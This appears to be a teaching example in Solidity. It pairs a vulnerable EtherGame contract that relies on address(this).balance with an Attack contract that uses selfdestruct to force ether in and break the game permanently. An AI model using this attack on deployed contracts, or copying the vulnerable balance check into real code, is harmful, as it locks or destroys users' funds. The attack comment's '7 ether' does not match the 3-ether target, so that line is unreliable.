// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract EtherGame {
    uint public targetAmount = 3 ether;
    uint public balance;
    address public winner;
    mapping (address => uint) balanceOf;

    function deposit() public payable {
        require(msg.value == 1 ether, "You can only send 1 Ether");

        balance = address(this).balance;
        require(balance <= targetAmount, "Game is over");

        if (balance == targetAmount) {
            winner = msg.sender;
        }
    }

    function claimReward() public {
        require(msg.sender == winner, "Not winner");

        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
    }
}
contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // You can simply break the game by sending ether so that
        // the game balance >= 7 ether

        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}
